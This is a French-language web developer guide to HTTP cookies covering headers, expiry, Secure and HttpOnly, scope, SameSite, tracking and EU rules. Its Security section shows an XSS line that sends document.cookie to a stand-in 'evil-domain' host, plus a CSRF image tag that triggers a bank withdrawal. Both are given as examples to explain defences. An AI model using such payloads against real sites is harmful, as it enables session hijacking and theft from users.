---
title: HTTP cookies
slug: Web/HTTP/Cookies
tags:
  - Cookies
  - Guide
  - HTTP
translation_of: Web/HTTP/Cookies
---
{{HTTPSidebar}}

Un cookie HTTP (cookie web, cookie de navigateur) est un petit ensemble de données qu'un serveur envoie au navigateur web de l'utilisateur. Le navigateur peut alors le stocker localement, puis le renvoyer à la prochaine requête vers le même serveur. Typiquement, cette méthode est utilisée par le serveur pour déterminer si deux requêtes proviennent du même navigateur.

Cela permet, par exemple, de garder un utilisateur connecté. Les cookies permettent de conserver de l'information en passant par le procotole HTTP qui est lui "sans état".

Les cookies sont utilisés pour 3 raisons principales :

- Gestion des sessions
  - : Logins, panier d'achat, score d'un jeu, ou tout autre chose dont le serveur doit se souvenir.
- Personnalisation
  - : Préférences utilisateur, thèmes, et autres paramètres.
- Suivi
  - : Enregistrement et analyse du comportement utilisateur.

Les cookies étaient auparavant utilisés pour le stockage côté client. C'était légitime lorsque les cookies étaient la seule manière de stocker des données côté client, mais il est aujourd'hui recommandé de préférer les APIs modernes de stockage. Les cookies sont envoyés avec chaque requête, ils peuvent donc avoir un impact négatif sur les performances (particulièrement pour des connexions mobiles). Les APIs modernes de stockage côté client sont l'[API Web storage](/fr/docs/Web/API/Web_Storage_API "DOM Storage") (`localStorage` et `sessionStorage`) et [IndexedDB](/fr/docs/Web/API/API_IndexedDB).

> **Note :** Pour voir les cookies stockés (et d'autres stockages que le navigateur peut conserver), vous ouvrez l'[Inspecteur de stockage](/fr/docs/Outils/Inspecteur_de_stockage) des Outils Développeur et sélectionnez Cookies dans l'onglet stockage (pour Firefox).

## Création de cookies

Après avoir reçu une requête HTTP, un serveur peut renvoyer sa réponse avec une ou des entête(s) {{HTTPHeader("Set-Cookie")}}. Le cookie ou les cookies ainsi définis sont habituellement stockés par le navigateur, puis renvoyés lors des prochaines requêtes au même serveur, dans une entête HTTP {{HTTPHeader("Cookie")}}. Une date d'expiration ou une durée peut être spécifiée par cookie, après quoi le cookie ne sera plus envoyé. De plus, des restrictions à un domaine ou un chemin spécifiques peuvent être spécifiés, limitant quand le cookie est envoyé.

### Les entêtes `Set-Cookie` et `Cookie`

L'entête de réponse HTTP {{HTTPHeader("Set-Cookie")}} envoie un cookie depuis le serveur vers le navigateur. Un cookie simple est défini comme ceci:

    Set-Cookie: <nom-du-cookie>=<valeur-du-cookie>

> **Note :** Voici comment utiliser l'en-tête `Set-Cookie` dans divers langages de programmation côté serveur :
>
> - [PHP](https://secure.php.net/manual/en/function.setcookie.php)
> - [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
> - [Python](https://docs.python.org/3/library/http.cookies.html)
> - [Ruby on Rails](http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)

Exemple de réponse HTTP complète:

    HTTP/1.0 200 OK
    Content-type: text/html
    Set-Cookie: yummy_cookie=choco
    Set-Cookie: tasty_cookie=strawberry

    [contenu de la page]

Maintenant, à chaque requête vers le serveur, le navigateur va renvoyer au serveur tous les cookies stockés, avec l'entête {{HTTPHeader("Cookie")}}:

    GET /sample_page.html HTTP/1.1
    Host: www.example.org
    Cookie: yummy_cookie=choco; tasty_cookie=strawberry

### Cookies de session

Le cookie créé ci-dessus est un *cookie de session*&nbsp;: il est effacé quand le navigateur est fermé, puisqu'on n'a pas spécifié de directive `Expires` ou `Max-Age`. Notons cependant que les navigateurs web peuvent utiliser la **restauration de session**, ce qui fait de la plupart des cookies des cookies permanents, comme si le navigateur n'avait jamais été fermé.

### Cookies permanents

Plutôt que d'expirer quand le client ferme, _les cookies permanents_ expirent à une date spécifique (`Expires`) ou après un certain temps (`Max-Age`).

    Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;

> **Note :** Quand une date d'expiration est définie, le temps et l'heure définis sont relatifs au client auquel le cookie est envoyé, et non au serveur.

### Cookies `Secure` et `HttpOnly`

Un cookie sécurisé est uniquement envoyé au serveur avec les requêtes chiffrées, via le protocole HTTPS. Même avec `Secure`, les informations sensibles ne devraient _jamais_ être stockées dans les cookies, car ils sont intrinsèquement non sécurisés et cette option ne peut pas offrir de protection réelle. À partir de Chrome 52 et Firefox 52, les sites non sécurisés (`http:`) ne peuvent pas définir de cookies avec la directive `Secure`.

Pour empêcher les attaques de cross-site scripting ({{Glossary("Cross-site_scripting","XSS")}}), on peut utiliser les cookies `HttpOnly`, qui sont inaccessibles à l'API JavaScript {{domxref("Document.cookie")}}; ils sont uniquement envoyés au serveur. Par exemple, les cookies qui persistent la session côté serveur n'ont pas besoin d'être accessibles via JavaScript, et l'option `HttpOnly` doit être définie.

    Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly

### Portée des cookies

Les directives `Domain` et `Path` définissent la _portée_ d'un cookie : sur quelles URLs les cookies doivent être envoyés.

`Domain` spécifie les hôtes autorisés à recevoir le cookie. S'il n'est pas spécifié, il s'agit par défaut de [l'hôte de l'emplacement actuel du document](/fr/docs/Web/API/Document/location), en **excluant les sous-domaines**. Si `Domain` est spécifié, alors les sous-domaines sont toujours inclus. Par exemple, si `Domain=mozilla.org` est défini, alors les cookies sont envoyés sur les sous-domaines comme `developer.mozilla.org`.

`Path` indique pour quels chemins d'URL on doit envoyer l'entête `Cookie`. Le caractère %x2F ("/") est considéré comme un séparateur de répertoire, et les sous-répertoires seront également acceptés. Par exemple, si `Path=/docs` est défini, ces chemins seront acceptés :

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`

### Cookies `SameSite` {{experimental_inline}}

Les cookies `SameSite` laissent les serveurs exiger qu'un cookie ne soit pas envoyé avec les requêtes cross-site, ce qui protège un peu contre les attaques Cross-Site Request Forgery ({{Glossary("CSRF")}}). Les cookies `SameSite` sont encore expérimentaux et ne sont pas encore supportés par tous les navigateurs.

### Accès JavaScript en utilisant `Document.cookie`

De nouveaux cookies peuvent également être créés via JavaScript en utilisant la propriété  {{domxref("Document.cookie")}}, et si l'option `HttpOnly` n'est pas définie, les cookies existants peuvent être également accédés via JavaScript.

```js
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// affiche "yummy_cookie=choco; tasty_cookie=strawberry"
```

Prenez garde aux problèmes de sécurité, décrits dans la section [Sécurité](#sécurité) ci-dessous. Les cookies disponibles via JavaScript peuvent être volés en utilisant les failles XSS.

## Sécurité

> **Note :** Les informations confidentielles ou sensibles ne devraient jamais être stockées ou transmises avec les Cookies HTTP, car le mécanisme entier est intrinsèquement non sécurisé.

### Piratage de session et XSS

Les cookies sont souvent utilisés dans une application web pour identifier un utilisateur et leur session, ainsi le vol de cookies peut entraîner le piratage de la session de l'utilisateur authentifié. Les moyens courants de vol de cookies sont le Social Engineering ou l'exploitation des vulnérabilités {{Glossary("Cross-site_scripting","XSS")}} de l'application.

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

L'attribut `HttpOnly` du cookie peut aider à empêcher cette attaque en bloquant l'accès à cette valeur de cookie via JavaScript.

### Cross-Site Request Forgery (CSRF)

[Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) mentionne un autre bon exemple d'attaque {{Glossary("CSRF")}}. Quand quelqu'un inclut une image qui n'est pas réellement une image (par exemple dans le cas d'un chat ou d'un forum), mais envoie en réalité une requête à la banque pour retirer de l'argent:

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

Maintenant, si vous étiez connecté à votre compte bancaire et que vos cookies étaient toujours valides (et qu'il n'y ait pas d'autre demande de validation), vous transféreriez de l'argent dès que vous afficheriez la page qui charge cette image. Il y a quelques techniques qu peuvent être utilisées pour limiter les risques:

- Comme pour {{Glossary("Cross-site_scripting","XSS")}}, filtrer les données en entrée est important.
- Il devrait toujours y avoir une confirmation requise pour toute action sensible.
- Les cookies utilisés pour les actions sensibles ne doivent avoir qu'une durée de vie limitée.
- Pour plus de conseils de prévention, voir [OWASP CSRF prevention cheat sheet](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>).

## Suivi et confidentialité

### Cookies tiers

Les cookies ont un domaine qui leur est associé. Si ce domaine est le même que la page sur laquelle vous êtes, on parle de cookie interne (_first-party cookie_). Si le domaine est différent, on parle de cookie tiers (_third-party cookie_).

Alors que les cookies internes sont uniquement envoyés au serveur qui les a définis, une page web peut également contenir des images ou tout autre composant stockés sur d'autres domaines (comme des bannières publicitaires). Les cookies qui sont envoyés via les composants tiers sont appelés cookies tiers et ils sont principalement utilisés pour la publicité et le suivi sur le web. Voir par exemple les [types de cookies utilisés par Google](https://www.google.com/policies/technologies/types/). La plupart des navigateurs autorisent les cookies tiers par défaut, mais il existe des addons disponibles pour les bloquer (par exemple, [Privacy Badger](https://addons.mozilla.org/en-US/firefox/addon/privacy-badger17/) par [EFF](https://www.eff.org/)).

Si vous n'avertissez pas vos utilisateurs de l'utilisation de cookies tiers, vous pouvez perdre leur confiance s'ils la découvrent. Une divulgation claire (tel que dans une politique de confidentialité) tend à éliminer les effets négatifs d'une telle découverte. Quelques pays ont également une législation sur les cookies. Voir par exemple l'article [cookie statement](https://wikimediafoundation.org/wiki/Cookie_statement) de Wikipedia.

### Do-Not-Track

Il n'y a pas d'obligations légales ou technologiques pour son utilisation, mais l'entête {{HTTPHeader("DNT")}} peut être utilisée pour signaler qu'une application web doit désactiver son suivi ou le suivi tiers d'un utilisateur. Voir l'entête {{HTTPHeader("DNT")}} pour plus d'informations.

### Directive de l'UE sur les cookies

Les exigences relatives aux cookies dans l'Union Européenne sont définies dans la [Directive 2009/136/EC](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136) du Parlement Européen entrée en vigeur le 25 mai 2011. Une directive n'est pas une loi en soi, mais une obligation pour les pays de l'Union Européenne de mettre en place des lois qui répondent aux exigences de la directive. La loi véritable peut différer d'un pays à l'autre.

Pour faire court, la directive de l'UE stipule qu'avant de pouvoir stocker ou récupérer des informations sur un ordinateur, téléphone mobile ou tout autre appareil, l'utilisateur doit donner son consentement de le faire en connaissance de cause. Beaucoup de sites web ont ajoutés des bannières depuis lors pour informer l'utilisateur sur l'utilisation des cookies.

Pour en savoir plus, voir [cette section Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive) et consultez les lois de l'état pour avoir des informations plus récentes et plus précises.

### Cookies Zombie et Evercookies

Une approche plus radicale des cookies sont les Cookies Zombies ou "Evercookies", qui sont des cookies recrées après leur suppression et intentionnellement difficiles à supprimer définitivement. Ils utilisent l'[API Web storage](/en-US/docs/Web/API/Web_Storage_API "DOM Storage"), les Flash Local Shared Objects et d'autres techniques pour se recréer d'eux mêmes dès que l'absence du cookie est détéctée.

- [Evercookie by Samy Kamkar](https://github.com/samyk/evercookie)
- [Zombie cookies sur Wikipedia](https://en.wikipedia.org/wiki/Zombie_cookie)

## Voir aussi

- {{HTTPHeader("Set-Cookie")}}
- {{HTTPHeader("Cookie")}}
- {{domxref("Document.cookie")}}
- {{domxref("Navigator.cookieEnabled")}}
- [Inspecting cookies using the Storage Inspector](/en-US/docs/Tools/Storage_Inspector)
- [Cookie specification: RFC 6265](https://tools.ietf.org/html/rfc6265)
- [Nicholas Zakas article on cookies](https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/)
- [Nicholas Zakas article on cookies and security](https://www.nczonline.net/blog/2009/05/12/cookies-and-security/)
- [HTTP cookie on Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie)
